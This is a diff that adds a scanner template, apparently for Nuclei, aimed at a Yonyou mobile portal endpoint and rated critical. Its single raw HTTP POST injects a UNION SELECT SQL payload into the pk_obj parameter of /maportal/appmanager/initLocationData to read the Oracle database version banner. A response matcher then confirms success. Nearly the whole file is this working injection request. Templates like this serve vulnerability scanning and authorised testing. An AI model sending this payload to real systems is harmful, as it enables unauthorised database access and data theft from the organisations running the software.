@@ -1,0 +1,29 @@
+id: yongyou-ydglpt-initLocationData-sql
+
+info:
+  name: yongyou-ydglpt-initLocationData-sql
+  author: yongyou-ydglpt-initLocationData-sql
+  severity: critical
+
+http:
+  - raw:
+      - |
+        POST /maportal/appmanager/initLocationData?pk_obj='+union+select%20banner,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL+from+sys.v_$version+where+rownum=1--+ HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Length: 1
+        Accept-Language: zh-CN,zh;q=0.8
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Connection: close
+        Cache-Control: max-age=0
+        Content-Type: application/x-www-form-urlencoded
+
+        =
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code==200 && contains_all(body,"pk_obj","primarykey")'
